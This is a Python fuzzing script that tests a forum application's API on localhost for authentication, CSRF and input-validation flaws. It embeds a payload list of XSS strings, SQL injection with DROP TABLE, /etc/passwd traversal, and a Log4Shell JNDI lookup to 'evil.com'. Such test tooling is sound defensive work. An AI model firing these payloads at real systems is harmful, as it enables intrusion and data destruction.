#!/usr/bin/env python3
"""
Comprehensive API Fuzzing Script for Forum Application

This script fuzzes all API endpoints with various combinations of:
- Valid/invalid authentication tokens
- Valid/invalid/missing CSRF tokens
- Valid/malformed/malicious data payloads
- Different user permission levels
- Database integrity verification

WARNING: This script is destructive and will modify/corrupt data in the database.
Only run this against a test environment.
"""

import asyncio
import aiosqlite
import random
import string
import json
import time
import sys
from typing import Dict, List, Any, Optional, Tuple, Union
from dataclasses import dataclass
from enum import Enum
import httpx
from datetime import datetime, timezone

# Database configuration
DATABASE_PATH = "forum.db"
API_BASE_URL = "http://localhost:8000"

class FuzzStatus(Enum):
    PASS = "PASS"
    FAIL = "FAIL"
    UNEXPECTED = "UNEXPECTED"
    ERROR = "ERROR"

@dataclass
class FuzzCase:
    name: str
    method: str
    endpoint: str
    requires_auth: bool = False
    requires_csrf: bool = False
    requires_admin: bool = False
    body: Optional[Dict] = None
    expected_status: Union[int, List[int]] = 200
    description: str = ""

@dataclass
class FuzzResult:
    case: FuzzCase
    status_code: int
    response_data: Any
    duration: float
    result: str
    error_message: str = ""

class APIFuzzer:
    def __init__(self, base_url: str = API_BASE_URL, db_path: str = DATABASE_PATH):
        self.base_url = base_url
        self.db_path = db_path
        self.client = httpx.AsyncClient()
        self.db = None

        # Authentication state
        self.valid_tokens = {}
        self.valid_csrf_tokens = {}
        self.session_cookies = {}

        # Test data
        self.test_users = []
        self.test_boards = []
        self.test_threads = []
        self.test_posts = []

        # Results
        self.results = []
        self.vulnerabilities = []

    async def setup_db_connection(self):
        """Setup database connection for verification"""
        self.db = await aiosqlite.connect(self.db_path)
        self.db.row_factory = aiosqlite.Row

    async def cleanup(self):
        """Cleanup resources"""
        await self.client.aclose()
        if self.db:
            await self.db.close()

    def generate_random_string(self, length: int = 10) -> str:
        """Generate random string for testing"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def generate_malicious_payloads(self) -> List[str]:
        """Generate various malicious payloads"""
        return [
            "<script>alert('xss')</script>",
            "' OR 1=1 --",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "A" * 10000,  # Buffer overflow attempt
            "\x00\x01\x02",  # Null bytes
            "../../config.py",
            "<iframe src='javascript:alert(1)'></iframe>",
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
        ]

    def generate_invalid_tokens(self) -> List[str]:
        """Generate invalid JWT-like tokens"""
        return [
            "invalid.token.here",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
            "",
            "null",
            "undefined",
            "Bearer token",
            "A" * 500,  # Very long token
            "../../secrets",
        ]

    async def create_test_users(self) -> Dict[str, Dict]:
        """Create test users with different permission levels"""
        users = {
            'admin': {
                'username': f'admin_{self.generate_random_string(5)}',
                'email': f'admin_{self.generate_random_string(5)}@test.com',
                'password': 'AdminPassword123!'
            },
            'regular': {
                'username': f'user_{self.generate_random_string(5)}',
                'email': f'user_{self.generate_random_string(5)}@test.com',
                'password': 'UserPassword123!'
            },
            'banned': {
                'username': f'banned_{self.generate_random_string(5)}',
                'email': f'banned_{self.generate_random_string(5)}@test.com',
                'password': 'BannedPassword123!'
            }
        }

        created_users = {}

        for user_type, user_data in users.items():
            try:
                # Register user
                response = await self.client.post(
                    f"{self.base_url}/api/auth/register",
                    json=user_data
                )
                if response.status_code == 200:
                    resp_data = response.json()
                    created_users[user_type] = {
                        'data': user_data,
                        'token': resp_data.get('access_token'),
                        'csrf_token': resp_data.get('csrf_token'),
                        'user_info': resp_data.get('user')
                    }

                    # Store session cookies
                    if response.cookies.get('session_id'):
                        self.session_cookies[user_type] = response.cookies.get('session_id')

                    print(f"Created {user_type} user: {user_data['username']}")

                    # Make admin user an actual admin via database
                    if user_type == 'admin' and self.db:
                        user_id = resp_data.get('user', {}).get('user_id')
                        if user_id:
                            await self.db.execute(
                                "UPDATE users SET is_admin = TRUE WHERE user_id = ?",
                                (user_id,)
                            )
                            await self.db.commit()
                            print(f"Granted admin privileges to user {user_id}")

                    # Ban the banned user
                    if user_type == 'banned' and self.db:
                        user_id = resp_data.get('user', {}).get('user_id')
                        if user_id:
                            await self.db.execute(
                                "UPDATE users SET is_banned = TRUE WHERE user_id = ?",
                                (user_id,)
                            )
                            await self.db.commit()
                            print(f"Banned user {user_id}")

            except Exception as e:
                print(f"Failed to create {user_type} user: {e}")

        self.test_users = created_users
        return created_users

    async def create_test_data(self):
        """Create test boards, threads, and posts"""
        if not self.test_users.get('admin'):
            print("No admin user available for creating test data")
            return

        admin_token = self.test_users['admin']['token']
        admin_csrf = self.test_users['admin']['csrf_token']
        admin_session = self.session_cookies.get('admin')

        headers = {
            'Authorization': f'Bearer {admin_token}',
            'X-CSRF-Token': admin_csrf,
            'Content-Type': 'application/json'
        }
        cookies = {'session_id': admin_session} if admin_session else {}

        # Create test board
        try:
            board_response = await self.client.post(
                f"{self.base_url}/api/boards",
                json={'name': f'Test Board {self.generate_random_string(3)}', 'description': 'Test board for fuzzing'},
                headers=headers,
                cookies=cookies
            )
            if board_response.status_code == 200:
                board_data = board_response.json()
                self.test_boards.append(board_data)
                print(f"Created test board: {board_data.get('name')}")

                # Create test thread
                if self.test_users.get('regular'):
                    regular_token = self.test_users['regular']['token']
                    regular_csrf = self.test_users['regular']['csrf_token']
                    regular_session = self.session_cookies.get('regular')

                    thread_headers = {
                        'Authorization': f'Bearer {regular_token}',
                        'X-CSRF-Token': regular_csrf,
                        'Content-Type': 'application/json'
                    }
                    thread_cookies = {'session_id': regular_session} if regular_session else {}

                    thread_response = await self.client.post(
                        f"{self.base_url}/api/boards/{board_data['board_id']}/threads",
                        json={'title': f'Test Thread {self.generate_random_string(3)}', 'content': 'Test thread content'},
                        headers=thread_headers,
                        cookies=thread_cookies
                    )
                    if thread_response.status_code == 200:
                        thread_data = thread_response.json()
                        self.test_threads.append(thread_data)
                        print(f"Created test thread: {thread_data.get('title')}")

                        # Create test post
                        post_response = await self.client.post(
                            f"{self.base_url}/api/threads/{thread_data['thread_id']}/posts",
                            json={'content': 'Test post content'},
                            headers=thread_headers,
                            cookies=thread_cookies
                        )
                        if post_response.status_code == 200:
                            post_data = post_response.json()
                            self.test_posts.append(post_data)
                            print(f"Created test post: {post_data.get('post_id')}")

        except Exception as e:
            print(f"Error creating test data: {e}")

    def get_test_cases(self) -> List[FuzzCase]:
        """Generate comprehensive test cases"""
        cases = []

        # Authentication endpoints
        cases.extend([
            FuzzCase("register_valid", "POST", "/api/auth/register",
                    body={'username': f'fuzz_{self.generate_random_string(5)}', 'email': f'fuzz_{self.generate_random_string(5)}@test.com', 'password': 'Password123!'},
                    expected_status=[200, 429], description="Valid user registration (may be rate limited)"),
            FuzzCase("register_xss_username", "POST", "/api/auth/register",
                    body={'username': "<script>alert('xss')</script>", 'email': 'test@test.com', 'password': 'Password123!'},
                    expected_status=422, description="XSS in username"),
            FuzzCase("register_sql_injection", "POST", "/api/auth/register",
                    body={'username': "'; DROP TABLE users; --", 'email': 'test@test.com', 'password': 'Password123!'},
                    expected_status=422, description="SQL injection in username"),
            FuzzCase("register_long_input", "POST", "/api/auth/register",
                    body={'username': 'A' * 1000, 'email': 'test@test.com', 'password': 'Password123!'},
                    expected_status=422, description="Buffer overflow attempt"),
        ])

        # User management endpoints
        if self.test_users:
            user_id = self.test_users.get('regular', {}).get('user_info', {}).get('user_id', 1)
            cases.extend([
                FuzzCase("get_user_no_auth", "GET", f"/api/users/{user_id}",
                        expected_status=401, description="Get user without authentication"),
                FuzzCase("get_user_valid", "GET", f"/api/users/{user_id}", requires_auth=True,
                        expected_status=200, description="Get user with valid auth"),
                FuzzCase("update_user_no_csrf", "PUT", f"/api/users/{user_id}", requires_auth=True,
                        body={'bio': 'Updated bio'}, expected_status=403, description="Update without CSRF token"),
                FuzzCase("update_user_invalid_csrf", "PUT", f"/api/users/{user_id}", requires_auth=True, requires_csrf=True,
                        body={'bio': 'Updated bio'}, expected_status=403, description="Update with invalid CSRF token"),
            ])

        # Board management endpoints
        cases.extend([
            FuzzCase("get_boards", "GET", "/api/boards", expected_status=200, description="Get all boards"),
            FuzzCase("create_board_no_admin", "POST", "/api/boards",
                    body={'name': 'Test Board', 'description': 'Test'}, expected_status=[401, 403], description="Create board without admin"),
            FuzzCase("create_board_xss", "POST", "/api/boards", requires_auth=True, requires_csrf=True, requires_admin=True,
                    body={'name': "<script>alert('xss')</script>", 'description': 'Test'},
                    expected_status=401, description="XSS in board name"),
        ])

        # Thread management endpoints
        if self.test_boards:
            board_id = self.test_boards[0]['board_id']
            cases.extend([
                FuzzCase("get_threads", "GET", f"/api/boards/{board_id}/threads",
                        expected_status=200, description="Get threads from board"),
                FuzzCase("create_thread_no_auth", "POST", f"/api/boards/{board_id}/threads",
                        body={'title': 'Test Thread', 'content': 'Content'}, expected_status=401, description="Create thread without auth"),
                FuzzCase("create_thread_xss_title", "POST", f"/api/boards/{board_id}/threads", requires_auth=True, requires_csrf=True,
                        body={'title': "<script>alert('xss')</script>", 'content': 'Content'},
                        expected_status=422, description="XSS in thread title"),
                FuzzCase("create_thread_invalid_board", "POST", "/api/boards/99999/threads", requires_auth=True, requires_csrf=True,
                        body={'title': 'Test', 'content': 'Content'}, expected_status=404, description="Create thread in non-existent board"),
            ])

        # Post management endpoints
        if self.test_threads:
            thread_id = self.test_threads[0]['thread_id']
            cases.extend([
                FuzzCase("get_posts", "GET", f"/api/threads/{thread_id}/posts",
                        expected_status=200, description="Get posts from thread"),
                FuzzCase("create_post_xss", "POST", f"/api/threads/{thread_id}/posts", requires_auth=True, requires_csrf=True,
                        body={'content': "<script>alert('xss')</script>"},
                        expected_status=200, description="XSS in post content - should be sanitized"),
                FuzzCase("create_post_sql_injection", "POST", f"/api/threads/{thread_id}/posts", requires_auth=True, requires_csrf=True,
                        body={'content': "'; DROP TABLE posts; --"},
                        expected_status=200, description="SQL injection in post content"),
            ])

        # Admin endpoints
        if self.test_users.get('regular'):
            user_id = self.test_users['regular']['user_info']['user_id']
            cases.extend([
                FuzzCase("ban_user_no_admin", "POST", f"/api/admin/users/{user_id}/ban", requires_auth=True, requires_csrf=True,
                        body={'reason': 'Test ban'}, expected_status=403, description="Ban user without admin privileges"),
                FuzzCase("ban_user_xss_reason", "POST", f"/api/admin/users/{user_id}/ban", requires_auth=True, requires_csrf=True, requires_admin=True,
                        body={'reason': "<script>alert('xss')</script>"}, expected_status=200, description="XSS in ban reason"),
            ])

        # Edge cases and boundary testing
        cases.extend([
            FuzzCase("invalid_endpoint", "GET", "/api/nonexistent", expected_status=404, description="Non-existent endpoint"),
            FuzzCase("malformed_json", "POST", "/api/auth/register",
                    body="malformed json", expected_status=422, description="Malformed JSON body"),
            FuzzCase("empty_body", "POST", "/api/auth/register",
                    body={}, expected_status=422, description="Empty request body"),
        ])

        return cases

    async def execute_fuzz_case(self, case: FuzzCase, auth_token: str = None, csrf_token: str = None,
                              session_cookie: str = None, use_invalid_tokens: bool = False) -> FuzzResult:
        """Execute a single fuzz test case"""
        start_time = time.time()

        # Prepare headers
        headers = {'Content-Type': 'application/json'}
        cookies = {}

        # Handle authentication
        if case.requires_auth or auth_token:
            if use_invalid_tokens:
                headers['Authorization'] = f'Bearer {random.choice(self.generate_invalid_tokens())}'
            elif auth_token:
                headers['Authorization'] = f'Bearer {auth_token}'
            else:
                headers['Authorization'] = f'Bearer invalid_token'

        # Handle CSRF token
        if case.requires_csrf or csrf_token:
            if use_invalid_tokens:
                headers['X-CSRF-Token'] = self.generate_random_string(32)
            elif csrf_token:
                headers['X-CSRF-Token'] = csrf_token
            else:
                headers['X-CSRF-Token'] = 'invalid_csrf_token'

        # Handle session cookie
        if session_cookie:
            cookies['session_id'] = session_cookie

        try:
            # Execute request
            if case.method.upper() == 'GET':
                response = await self.client.get(f"{self.base_url}{case.endpoint}", headers=headers, cookies=cookies)
            elif case.method.upper() == 'POST':
                response = await self.client.post(f"{self.base_url}{case.endpoint}",
                                                json=case.body, headers=headers, cookies=cookies)
            elif case.method.upper() == 'PUT':
                response = await self.client.put(f"{self.base_url}{case.endpoint}",
                                               json=case.body, headers=headers, cookies=cookies)
            elif case.method.upper() == 'PATCH':
                response = await self.client.patch(f"{self.base_url}{case.endpoint}",
                                                 json=case.body, headers=headers, cookies=cookies)
            elif case.method.upper() == 'DELETE':
                response = await self.client.delete(f"{self.base_url}{case.endpoint}", headers=headers, cookies=cookies)
            else:
                raise ValueError(f"Unsupported HTTP method: {case.method}")

            duration = time.time() - start_time

            # Analyze response
            try:
                response_data = response.json() if response.content else None
            except:
                response_data = response.text if response.content else None

            # Determine result
            expected_statuses = case.expected_status if isinstance(case.expected_status, list) else [case.expected_status]
            if response.status_code in expected_statuses:
                result = FuzzStatus.PASS.value
            elif response.status_code in [500, 502, 503, 504]:
                result = FuzzStatus.ERROR.value
            else:
                result = FuzzStatus.UNEXPECTED.value

            return FuzzResult(
                case=case,
                status_code=response.status_code,
                response_data=response_data,
                duration=duration,
                result=result
            )

        except Exception as e:
            duration = time.time() - start_time
            return FuzzResult(
                case=case,
                status_code=0,
                response_data=None,
                duration=duration,
                result=FuzzStatus.ERROR.value,
                error_message=str(e)
            )

    async def verify_database_integrity(self) -> List[Dict]:
        """Check database for potential corruption or injection"""
        if not self.db:
            return []

        issues = []

        # Check for XSS in user data
        async with self.db.execute("SELECT user_id, username, email FROM users") as cursor:
            async for row in cursor:
                for field in ['username', 'email']:
                    value = row[field]
                    if value and ('<script>' in value.lower() or 'javascript:' in value.lower()):
                        issues.append({
                            'type': 'XSS_IN_DATABASE',
                            'table': 'users',
                            'field': field,
                            'user_id': row['user_id'],
                            'value': value
                        })

        # Check for suspicious content in posts
        async with self.db.execute("SELECT post_id, content FROM posts WHERE deleted = FALSE") as cursor:
            async for row in cursor:
                content = row['content']
                if content:
                    if '<script>' in content.lower() or 'javascript:' in content.lower():
                        issues.append({
                            'type': 'XSS_IN_POSTS',
                            'table': 'posts',
                            'post_id': row['post_id'],
                            'content_preview': content[:100]
                        })

        # Check for unusual characters or potential encoding issues
        async with self.db.execute("SELECT COUNT(*) as count FROM users WHERE username LIKE '%\\x00%' OR username LIKE '%\\x01%'") as cursor:
            row = await cursor.fetchone()
            if row and row['count'] > 0:
                issues.append({
                    'type': 'NULL_BYTES_IN_DATA',
                    'table': 'users',
                    'count': row['count']
                })

        return issues

    async def run_comprehensive_fuzzing(self):
        """Run comprehensive fuzzing with all combinations"""
        print("🚀 Starting Comprehensive API Fuzzing")
        print("=" * 50)

        # Setup
        await self.setup_db_connection()

        # Create test users and data
        print("📝 Creating test users...")
        await self.create_test_users()

        print("📊 Creating test data...")
        await self.create_test_data()

        # Generate test cases
        print("🧪 Generating test cases...")
        test_cases = self.get_test_cases()
        print(f"Generated {len(test_cases)} test cases")

        # Execute tests with different authentication scenarios
        scenarios = [
            ('no_auth', None, None, None),
            ('invalid_tokens', None, None, None),
            ('regular_user', 'regular', 'regular', 'regular'),
            ('admin_user', 'admin', 'admin', 'admin'),
            ('banned_user', 'banned', 'banned', 'banned'),
            ('mixed_tokens', 'regular', 'admin', 'regular'),  # Mixed credentials
            ('expired_session', 'regular', 'regular', None),  # No session cookie
        ]

        print(f"\n🔧 Running {len(test_cases) * len(scenarios)} total test combinations...")

        for scenario_name, auth_user, csrf_user, session_user in scenarios:
            print(f"\n--- Testing scenario: {scenario_name} ---")

            auth_token = self.test_users.get(auth_user, {}).get('token') if auth_user else None
            csrf_token = self.test_users.get(csrf_user, {}).get('csrf_token') if csrf_user else None
            session_cookie = self.session_cookies.get(session_user) if session_user else None

            use_invalid = scenario_name == 'invalid_tokens'

            for i, case in enumerate(test_cases):
                result = await self.execute_fuzz_case(
                    case, auth_token, csrf_token, session_cookie, use_invalid
                )
                self.results.append(result)

                # Log interesting results
                if result.result in [FuzzStatus.ERROR.value, FuzzStatus.UNEXPECTED.value]:
                    print(f"  ⚠️  {case.name} ({scenario_name}): {result.status_code} - {result.result}")
                    if result.error_message:
                        print(f"      Error: {result.error_message}")

                # Check for potential vulnerabilities
                expected_statuses = case.expected_status if isinstance(case.expected_status, list) else [case.expected_status]
                if result.status_code == 200 and 200 not in expected_statuses:
                    self.vulnerabilities.append({
                        'case': case.name,
                        'scenario': scenario_name,
                        'issue': f'Unexpected success (expected {case.expected_status}, got 200)',
                        'response': result.response_data
                    })

                # Progress indicator
                if (i + 1) % 10 == 0:
                    print(f"  Progress: {i + 1}/{len(test_cases)} cases completed")

        # Database integrity check
        print("\n🔍 Checking database integrity...")
        db_issues = await self.verify_database_integrity()

        # Generate report
        await self.generate_report(db_issues)

    async def generate_report(self, db_issues: List[Dict]):
        """Generate comprehensive fuzzing report"""
        print("\n" + "=" * 50)
        print("📋 FUZZING REPORT")
        print("=" * 50)

        # Summary statistics
        total_tests = len(self.results)
        passed = len([r for r in self.results if r.result == FuzzStatus.PASS.value])
        failed = len([r for r in self.results if r.result == FuzzStatus.FAIL.value])
        errors = len([r for r in self.results if r.result == FuzzStatus.ERROR.value])
        unexpected = len([r for r in self.results if r.result == FuzzStatus.UNEXPECTED.value])

        print(f"\n📊 SUMMARY:")
        print(f"Total tests executed: {total_tests}")
        print(f"✅ Passed: {passed}")
        print(f"❌ Failed: {failed}")
        print(f"🔥 Errors: {errors}")
        print(f"⚠️  Unexpected: {unexpected}")

        # Vulnerabilities found
        print(f"\n🚨 POTENTIAL VULNERABILITIES: {len(self.vulnerabilities)}")
        for vuln in self.vulnerabilities:
            print(f"  - {vuln['case']} ({vuln['scenario']}): {vuln['issue']}")

        # Database integrity issues
        print(f"\n🗄️  DATABASE ISSUES: {len(db_issues)}")
        for issue in db_issues:
            print(f"  - {issue['type']}: {issue}")

        # Error details
        error_results = [r for r in self.results if r.result == FuzzStatus.ERROR.value]
        if error_results:
            print(f"\n💥 ERROR DETAILS:")
            for result in error_results[:10]:  # Show first 10 errors
                print(f"  - {result.case.name}: {result.error_message}")

        # Unexpected successes (potential auth bypasses)
        auth_bypasses = [r for r in self.results if r.status_code == 200 and
                        (r.case.requires_auth or r.case.requires_admin) and
                        'no_auth' in str(r)]
        if auth_bypasses:
            print(f"\n🔓 POTENTIAL AUTHENTICATION BYPASSES:")
            for result in auth_bypasses:
                print(f"  - {result.case.name}: Got 200 without proper auth")

        # Performance issues
        slow_requests = [r for r in self.results if r.duration > 5.0]
        if slow_requests:
            print(f"\n🐌 SLOW REQUESTS (>5s): {len(slow_requests)}")
            for result in slow_requests:
                print(f"  - {result.case.name}: {result.duration:.2f}s")

        # Save detailed report to file
        report_file = f"fuzz_report_{int(time.time())}.json"
        with open(report_file, 'w') as f:
            json.dump({
                'timestamp': datetime.now(timezone.utc).isoformat(),
                'summary': {
                    'total_tests': total_tests,
                    'passed': passed,
                    'failed': failed,
                    'errors': errors,
                    'unexpected': unexpected
                },
                'vulnerabilities': self.vulnerabilities,
                'database_issues': db_issues,
                'detailed_results': [
                    {
                        'case_name': r.case.name,
                        'case_description': r.case.description,
                        'method': r.case.method,
                        'endpoint': r.case.endpoint,
                        'expected_status': r.case.expected_status,
                        'actual_status': r.status_code,
                        'result': r.result,
                        'duration': r.duration,
                        'error_message': r.error_message,
                        'response_preview': str(r.response_data)[:200] if r.response_data else None
                    }
                    for r in self.results
                ]
            }, f, indent=2, default=str)

        print(f"\n📄 Detailed report saved to: {report_file}")
        print("\n🏁 Fuzzing completed!")

async def main():
    """Main execution function"""
    if len(sys.argv) > 1 and sys.argv[1] == '--confirm-destructive':
        print("⚠️  DESTRUCTIVE TESTING CONFIRMED")
    else:
        print("⚠️  WARNING: This script will modify/corrupt database data!")
        print("⚠️  Only run against test environments!")
        print("⚠️  Add --confirm-destructive flag to proceed")
        return

    fuzzer = APIFuzzer()
    try:
        await fuzzer.run_comprehensive_fuzzing()
    finally:
        await fuzzer.cleanup()

if __name__ == "__main__":
    asyncio.run(main())